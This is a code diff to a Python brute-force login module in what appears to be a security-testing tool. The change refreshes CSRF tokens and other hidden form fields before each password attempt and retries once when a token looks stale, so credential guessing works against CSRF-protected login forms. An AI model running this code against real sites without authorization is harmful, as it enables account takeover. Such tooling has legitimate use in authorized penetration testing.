@@ -209,6 +209,34 @@ class BruteForce(BaseAttackModule):
             pass
         return entries
 
+    def _fetch_hidden_fields(
+        self, http_client: Any, form_page_url: str,
+    ) -> dict[str, str] | None:
+        """Re-fetch the login page and parse a fresh set of hidden inputs.
+
+        Returns a name→value dict, or None if the request failed. CSRF
+        tokens are per-request on many frameworks (Django, Rails), so we
+        cannot reuse the values captured at probe time across attempts.
+        """
+        try:
+            from bs4 import BeautifulSoup
+            resp = http_client.get(form_page_url)
+        except Exception:
+            return None
+        if resp.status_code >= 400:
+            return None
+        try:
+            soup = BeautifulSoup(resp.text, "lxml")
+        except Exception:
+            return None
+        fresh: dict[str, str] = {}
+        for inp in soup.find_all("input"):
+            if inp.get("type", "").lower() == "hidden":
+                name = inp.get("name")
+                if name:
+                    fresh[name] = inp.get("value", "")
+        return fresh
+
     def _test_form(
         self,
         form: dict[str, Any],
@@ -223,6 +251,9 @@ class BruteForce(BaseAttackModule):
         username_field = form["username_field"]
         password_field = form["password_field"]
         hidden_fields = form.get("hidden_fields", [])
+        # URL we GET to refresh CSRF tokens. Falls back to the action URL
+        # if the form metadata didn't capture the page URL separately.
+        form_page_url = form.get("page_url") or form.get("action", "") or target
 
         # Build full action URL
         if action.startswith(("http://", "https://")):
@@ -248,24 +279,50 @@ class BruteForce(BaseAttackModule):
         )
         lockout_signal: dict[str, Any] | None = None
 
-        def test_single(creds: tuple[str, str]) -> dict[str, Any] | None:
+        # Static fallback fields captured at probe time. Used only when a
+        # fresh GET fails. CSRF-protected forms need the per-request token
+        # refresh below; static reuse causes silent 403/redirect failures.
+        static_hidden = {hf["name"]: hf["value"] for hf in hidden_fields}
+
+        def test_single(
+            creds: tuple[str, str], stale_csrf: bool = False,
+        ) -> dict[str, Any] | None:
+            """Issue one credential attempt. Refreshes hidden form fields
+            on every call (so CSRF tokens are valid) and re-fetches once
+            more if the caller signals the previous attempt looked stale.
+            """
             nonlocal lockout_detected
             if lockout_detected:
                 return None
 
             username, password = creds
+            fresh = self._fetch_hidden_fields(http_client, form_page_url)
+            if fresh is None:
+                fresh = dict(static_hidden)
+
             data: dict[str, str] = {username_field: username, password_field: password}
-            for hf in hidden_fields:
-                data[hf["name"]] = hf["value"]
+            data.update(fresh)
 
             start = time.monotonic()
             try:
                 if method == "POST":
                     resp = http_client.post(form_url, data=data)
                 else:
-                    resp = http_client.get(f"{form_url}?{username_field}={username}&{password_field}={password}")
+                    resp = http_client.get(
+                        f"{form_url}?{username_field}={username}&{password_field}={password}"
+                    )
 
                 elapsed = (time.monotonic() - start) * 1000
+                # Stale-CSRF detection: a 403 or redirect back to the login
+                # page after a POST is the canonical "your token expired"
+                # signal. We refresh and retry exactly once per attempt.
+                looks_stale = (
+                    resp.status_code == 403
+                    or (resp.status_code in (301, 302) and "login" in (resp.headers.get("Location", "").lower()))
+                )
+                if looks_stale and not stale_csrf and method == "POST":
+                    return test_single(creds, stale_csrf=True)
+
                 return {
                     "username": username,
                     "password": password,
@@ -274,6 +331,7 @@ class BruteForce(BaseAttackModule):
                     "body_preview": resp.text[:200].lower(),
                     "headers": dict(resp.headers),
                     "duration_ms": elapsed,
+                    "csrf_retried": stale_csrf,
                 }
             except Exception:
                 return None
